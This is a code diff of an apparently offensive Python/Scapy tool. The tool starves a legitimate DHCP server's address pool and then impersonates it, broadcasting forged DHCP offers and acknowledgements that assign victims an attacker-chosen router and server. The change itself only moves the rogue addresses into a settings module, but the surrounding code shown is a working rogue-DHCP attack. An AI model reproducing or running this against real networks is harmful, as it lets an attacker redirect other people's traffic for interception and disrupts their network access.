@@ -6,11 +6,6 @@ import dhcp_exhaust
 import ipaddress
 import settings
 
-rogue_serv = "10.10.10.1"
-broadcast_address = "10.10.10.255"
-subnet_mask = "255.255.255.0"
-router = "10.10.10.254"
-
 # EXHAUST IP POOL OF REAL DHCP
 dhcp_exhaust.exhaust()
 
@@ -29,9 +24,9 @@ def process(p):
             dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src='10.10.1.1', dst='255.255.255.255') \
                         / UDP(sport=68, dport=67) \
-                        / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
-                        / DHCP(options=[('message-type', 'offer'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
-                        ("router", router), ("subnet_mask", subnet_mask), ('end')])
+                        / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
+                        / DHCP(options=[('message-type', 'offer'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
+                        ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
             sendp(dhcp_offer, iface=settings.source_interface, verbose=0)
             print( " -> Offer sent")
         elif p["DHCP"].options[0][1] == 3:
@@ -39,9 +34,9 @@ def process(p):
             dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src='10.10.1.1', dst='10.10.1.2') \
                         / UDP(sport=68, dport=67) \
-                        / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
-                        / DHCP(options=[('message-type', 'ack'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
-                        ("router", router), ("subnet_mask", subnet_mask), ('end')])
+                        / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
+                        / DHCP(options=[('message-type', 'ack'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
+                        ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
             sendp(dhcp_ack, iface=settings.source_interface, verbose=0)
             database.append((p["Ether"].src,str(ip)))
             database = list(set(database)) # removing duplicates :)
